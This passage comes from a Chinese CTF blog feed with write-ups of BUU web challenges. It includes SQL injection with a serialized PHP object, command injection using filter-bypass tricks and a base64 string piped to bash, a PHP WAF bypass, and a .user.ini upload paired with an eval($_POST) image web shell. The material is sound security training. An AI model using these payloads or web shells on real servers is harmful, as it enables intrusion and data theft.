class="line">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure><p>至于为什么会想到这个，首先data中就是反序列化的字符串，并且，最后一个blog内容会被显示出来，这样就希望从blog中获得flag</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）"><a href="#GXYCTF2019-Ping-Ping-Ping（过滤空格和有黑名单）" class="headerlink" title="[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）"></a>[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）</h2><p>直接ping命令执行</p><p>用分号执行两个命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure><p>查看有flag.php，重要的就是怎么去读取flag.php</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png" alt="image-20200831111916451"></p><p><strong>这里发现过滤了空格，所以绕过空格的办法，简单来说有两种</strong>，第一种是${IFS}</p><ol><li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat$IFS$1flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第二种呢是重定向符</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat&lt;flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这里呢我们选用$&#123;IFS&#125;来绕过，之后又发现&#123;&#125;被过滤，所以用第三个方式</span><br><span class="line"></span><br><span class="line">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class="line"></span><br><span class="line">这时，我们发现flag也被过滤了，所以**黑名单绕过又有几种方式**</span><br><span class="line"></span><br><span class="line">1. 拼接</span><br></pre></td></tr></table></figure><p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. base64编码</span><br></pre></td></tr></table></figure><p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p><p>root@kali:~# echo “Y2F0IGZsYWc=”|base64 -d|bash<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 单引号、双引号</span><br></pre></td></tr></table></figure><p>root@kali:~# c””at fl’’ag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 反斜线</span><br></pre></td></tr></table></figure><p>root@kali:~# c\at fl\ag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这里直接拼接过去就好</span><br></pre></td></tr></table></figure><p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">即可拿到flag</span><br><span class="line"></span><br><span class="line">**主要是绕过空格和绕过黑名单**</span><br><span class="line"></span><br><span class="line">## [RoarCTF 2019]Easy Calc（php字符串解析）</span><br><span class="line"></span><br><span class="line">打开源码，发现calc.php ，然后访问calc.php</span><br><span class="line"></span><br><span class="line">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class="line"></span><br><span class="line">num变量过滤了一些东西，但我们用一些函数去访问时，会发现403拒绝访问，说明有waf</span><br><span class="line"></span><br><span class="line">通过网上查找，是**php的字符串解析特性**</span><br><span class="line"></span><br><span class="line">&gt; PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class="line">&gt;</span><br><span class="line">&gt; 1.删除空白符 </span><br><span class="line">&gt;</span><br><span class="line">&gt; 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</span><br><span class="line"></span><br><span class="line">先试一试phpinfo();可以用说明我们就成功了。</span><br><span class="line"></span><br><span class="line">接下来，就是读取目录，找flag了，从phpinfo中我们可以看见一些外部函数被ban了</span><br><span class="line"></span><br><span class="line">这时就需要介绍以下几个函数</span><br><span class="line"></span><br><span class="line">1. **scandir() 函数**:</span><br><span class="line">   返回指定目录中的文件和目录的数组。</span><br><span class="line"></span><br><span class="line">2. **base_convert(number,formbase,tobase) 函数**:</span><br><span class="line"></span><br><span class="line">   在任意进制之间转换数字。</span><br><span class="line"></span><br><span class="line">3. **dechex() 函数**：</span><br><span class="line"></span><br><span class="line">   把十进制转换为十六进制。</span><br><span class="line"></span><br><span class="line">4. **hex2bin() 函数**：</span><br><span class="line"></span><br><span class="line">   把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"></span><br><span class="line">5. **readfile() 函数**:</span><br><span class="line"></span><br><span class="line">   输出一个文件。</span><br><span class="line"></span><br><span class="line">6. **chr()函数**</span><br><span class="line"></span><br><span class="line">   十进制返回ascii字符</span><br><span class="line"></span><br><span class="line">7. **ord()函数**</span><br><span class="line"></span><br><span class="line">   ascii字符转换为十进制</span><br><span class="line"></span><br><span class="line">8. **file_get_contents()**</span><br><span class="line"></span><br><span class="line">   把文件读入一个字符串中</span><br><span class="line"></span><br><span class="line">通常会用hex2bin(dechex(47))一起使用，这个表示&#x2F;</span><br><span class="line"></span><br><span class="line">这里&#x2F;被过滤了</span><br><span class="line"></span><br><span class="line">所以payload可以为</span><br></pre></td></tr></table></figure><p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现flag直接readfile读取即可</span><br></pre></td></tr></table></figure><p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">还有其他的payload</span><br></pre></td></tr></table></figure><p>? num=base_convert(55490343972,10,36)()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## [ACTF2020 新生赛]Exec</span><br><span class="line"></span><br><span class="line">直接查就可以</span><br></pre></td></tr></table></figure><p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## [极客大挑战 2019]Http</span><br><span class="line"></span><br><span class="line">改请求包xff，ua，ref。</span><br></pre></td></tr></table></figure><p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 文件上传</span><br><span class="line"></span><br><span class="line">## [SUCTF 2019]CheckIn（.user.ini）</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;这个是初始目录</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true); &#x2F;&#x2F;如果不存在，就将创建目录可写可执行</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;  &#x2F;&#x2F;判断是否存在上传文件</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;  &#x2F;&#x2F;文件名不许为空</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;截取后缀名</span><br><span class="line">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;正则匹配，ph和htaccess都不可以</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;文件内容不许有&lt;?</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;判断一个图像的类型</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>源码如上，可以学习一下</p><p><strong>其中exif_imagetype()可以记录一下</strong></p><blockquote><p>但我们可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p><ul><li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li><li>PNG： 89 50 4E 47</li></ul></blockquote><p>这里想要上传成功，要借助一下.user.ini</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure><p>那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg</p><p>常见姿势：</p><p>比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 </p></blockquote><p>这里最后就要写一个图片马了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>然后把两个上传，连菜刀就可以拿到flag了</p><p><strong>主要来学习一下文件上传的操作</strong></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>这个直接上传就可以，改一下文件内容的头，然后改下文件名phtml</p><p>菜刀连接拿flag</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件index.php.bak</p><p>两个等号弱等于，直接123拿flag</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传改名字，拿flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>直接菜刀连接，根目录下有flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;BUU-Web&quot;&gt;&lt;a href=&quot;#BUU-Web&quot; class=&quot;headerlink&quot; title=&quot;BUU(Web)&quot;&gt;&lt;/a&gt;BUU(Web)&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;</summary>
      
    
    
    
    <category term="BUU" scheme="https://pz1o.top/categories/BUU/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="刷题" scheme="https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
</feed>
